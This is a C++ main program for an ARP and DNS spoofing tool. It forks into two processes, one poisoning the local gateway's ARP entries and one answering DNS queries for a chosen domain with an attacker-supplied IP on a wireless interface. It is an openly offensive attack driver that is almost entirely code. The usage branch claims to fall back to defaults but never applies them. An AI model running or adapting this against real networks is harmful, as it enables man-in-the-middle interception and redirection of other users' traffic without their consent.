#include <iostream>
#include <algorithm>
#include "ArpSpoofer.h"
#include "DnsSpoofer.h"
#include "GatewayInfo.h"

using std::for_each;
using std::string;

//char const *interface = "wlo1";
char const *interface = "wlan0";

uint8_t *getIpFromString(char *string);
vector<string> get_domain_name(char *query_payload);


int main(int argc, char * argv[]) {
    if(argc < 3){
        cout << "Provide target domain and resposne ip" << endl;
        cout << "example: dns_spoofer jacek.pl.com 192.168.0.10" << endl;
        cout << "Using default: dns_spoofer wiekon.com.pl yafud.pl_ip" << endl;
    }


    const vector<string> &domain = get_domain_name(argv[1]);
    uint8_t *redirect_ip = getIpFromString(argv[2]);


    GatewayInfo* gatewayInfo = new GatewayInfo();
    char *gw = gatewayInfo->getGateway();
    uint8_t *gateway = getIpFromString(gw);

    if(fork()){
        DnsSpoofer *dnsSpoofer = new DnsSpoofer();
        dnsSpoofer->start_spoofing(const_cast<char *>(interface), domain, redirect_ip);
    } else {
        auto arpSpoofer = new ArpSpoofer();
        arpSpoofer->start_spoofing(const_cast<char *>(interface), gateway);
    }

    return 0;
}

uint8_t *getIpFromString(char *string) {
    unsigned char *buf = new unsigned char[(sizeof(struct in6_addr))];
    inet_pton(AF_INET, string, buf);
    return buf;
}

vector<string> get_domain_name(char *query_payload) {
    vector<string> spoof_target;
    char *names = strtok(query_payload, ".");
    while(names != NULL){
        spoof_target.push_back(reinterpret_cast<char*>(names));
        names = strtok(NULL, ".");
    }

    return spoof_target;
}